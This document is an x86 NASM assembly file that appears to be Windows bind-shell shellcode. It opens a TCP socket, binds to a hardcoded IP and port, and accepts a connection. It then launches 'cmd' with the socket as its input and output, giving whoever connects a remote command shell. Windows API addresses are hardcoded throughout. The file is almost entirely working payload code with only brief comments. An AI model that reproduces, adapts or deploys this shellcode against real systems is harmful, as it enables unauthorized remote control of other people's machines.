section .text
global _start
  _start:
    ; I hardcoded all the function calls. If needed, can retrieve them dynamically.
    push ebp
    mov ebp, esp
    sub esp, 0x40           ; lift up stack

    ; WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
    push 0
    push 0
    push 0
    push 0x6
    push 0x1
    push 0x2
    mov eax, 0x71AB8769
    call eax
    mov [ebp-0x4], eax      ; servSock2 is at ebp-0x4

    ; setsockopt(servSock2,0xffff,4,const char *,4);
    push 0x4
    mov word [ebp],0x2
    push ebp
    push 4
    push 0xffff
    push dword [ebp-0x4]
    mov eax, 0x71AB3EA1
    call eax

    ; bind(servSock2, (SOCKADDR*)&sockAddr2, sizeof(SOCKADDR));
    xor ecx, ecx
    push ecx
    push ecx
    push 0x9817a8c0         ; ip
    push word 0xE110        ; port
    push word 0x02          ; AF_INET
    mov edi, esp            ; address of sockaddr struct
    push 0x10               ; sizeof(server)
    push edi                ; (SOCKADDR*)&server
    push dword [ebp-0x4]    ; servSock2
    mov eax, 0x71AB3E00
    call eax
    
    ; listen(servSock2,20)
    push 0x14
    push dword [ebp-0x4]
    mov eax, 0x71AB88D3
    call eax

    ; accept(servSock2, (SOCKADDR*)&clntAddr2, &nSize)
    mov dword [ebp], 0x10
    sub esp, 0x10
    mov eax, esp
    push ebp
    push eax
    push dword [ebp-0x4]
    mov eax, 0x71AC1028
    call eax
    mov [ebp-0x8], eax      ; clntSock2 is at ebp-0x8

    ; CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
    push eax
    push eax
    push eax
    xor ebx, ebx
    mov ecx, 0x12
    .pushloop:
        cmp ecx, 0
        je _start.pushdone
        push ebx
        sub ecx, 0x1
        jmp _start.pushloop
    .pushdone:
    mov ecx, esp                    ; ecx points to pinfo
    lea edx, [esp+0x10]             ; edx points to sinfo
    mov dword [edx+0x0], 0x44       ; cb
    mov dword [edx+0x2c], 0x100     ; dwFlags
    push 0x00646d63                 ; "cmd"
    mov edi, esp                    ; edi points to "cmd"
    xor eax, eax
    push ecx                        ; pinfo
    push edx                        ; sinfo
    push eax                        ; NULL
    push eax                        ; NULL
    push eax                        ; NULL
    inc eax
    push eax                        ; TRUE
    dec eax
    push eax                        ; NULL
    push eax                        ; NULL
    push edi                        ; "cmd"
    push eax                        ; NULL
    mov eax, 0x7C802367
    call eax

